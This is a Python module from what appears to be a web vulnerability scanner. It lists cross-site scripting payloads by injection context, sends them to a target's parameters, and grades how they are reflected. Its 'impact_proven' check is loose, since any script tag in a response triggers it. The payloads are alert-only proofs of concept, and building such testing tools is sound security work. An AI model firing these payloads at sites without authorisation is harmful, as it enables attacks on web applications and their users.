"""
XssPipeline — Pipeline de exploração de Cross-Site Scripting (Fase 3)

Verifica se o payload é refletido no contexto correto (HTML_BODY,
ATTRIBUTE, JS_STRING, URL) sem precisar de browser.

Para DOM XSS e casos autenticados → BrowserAttackEngine (Fase 4).
"""

from __future__ import annotations

import re
import uuid
from typing import List, Tuple

from core.models import QueueItem
from plugins.pipelines import BasePipeline, _HttpResult, _http_send


# Payloads por contexto de injeção
_PAYLOADS_BY_CONTEXT = {
    "HTML_BODY": [
        "<script>alert(document.domain)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<video><source onerror=alert(1)>",
    ],
    "ATTRIBUTE": [
        '" onmouseover="alert(1)',
        "' onfocus='alert(1)' autofocus='",
        '" autofocus onfocus="alert(1)',
        '" onload="alert(1)',
    ],
    "JS_STRING": [
        "'; alert(document.domain); //",
        '"; alert(document.domain); //',
        "`${alert(1)}`",
        "\\'; alert(1); //",
    ],
    "URL": [
        "javascript:alert(document.domain)",
        "data:text/html,<script>alert(1)</script>",
    ],
    "HEADER": [
        "<script>alert(1)</script>",
        '"><img src=x onerror=alert(1)>',
    ],
}

_PAYLOADS_GENERIC = _PAYLOADS_BY_CONTEXT["HTML_BODY"]


class XssPipeline(BasePipeline):
    name = "XssPipeline"
    MAX_ATTEMPTS = 5

    def _get_payloads(self, item: QueueItem) -> List[str]:
        return _PAYLOADS_BY_CONTEXT.get(item.context, _PAYLOADS_GENERIC)

    def _execute(self, item: QueueItem, payload: str) -> Tuple[str, _HttpResult]:
        # Usar marcador único para detecção inequívoca
        marker = f"RF{uuid.uuid4().hex[:8]}"
        tagged_payload = payload.replace("alert(1)", f"alert('{marker}')").replace(
            "alert(document.domain)", f"alert('{marker}')"
        )

        url = item.endpoint or item.target
        param = item.parameter

        if item.method.upper() == "POST":
            return _http_send(url, method="POST", data={param: tagged_payload} if param else {})
        else:
            params = {param: tagged_payload} if param else {}
            return _http_send(url, method="GET", params=params)

    def _verify(self, result: _HttpResult, payload: str, item: QueueItem) -> str:
        body = result.body
        context = item.context

        if result.status == 0:
            return "failed"

        # Verificar reflecção no contexto correto
        if context == "HTML_BODY":
            # Payload intacto ou tags scriptt no body
            if re.search(r"<script[^>]*>.*?</script>", body, re.IGNORECASE | re.DOTALL):
                return "impact_proven"
            if re.search(r"on\w+\s*=\s*['\"]?alert", body, re.IGNORECASE):
                return "impact_proven"
            if any(tag in body.lower() for tag in ["<img src=x", "<svg onload", "<details open"]):
                return "partial"

        elif context == "ATTRIBUTE":
            if re.search(r'on\w+\s*=\s*["\']?alert', body, re.IGNORECASE):
                return "impact_proven"
            if "onmouseover" in body or "onfocus" in body:
                return "partial"

        elif context == "JS_STRING":
            # Payload refletido fora de string JS → parcial
            stripped = payload.strip("'\"` ")
            if stripped and stripped in body:
                return "partial"

        elif context == "URL":
            if "javascript:alert" in body or "data:text/html" in body:
                return "impact_proven"

        # Reflecção genérica → parcial
        simple_markers = ["<script>", "onerror=", "onload=", "onfocus="]
        if any(m in body for m in simple_markers):
            return "partial"

        return "failed"
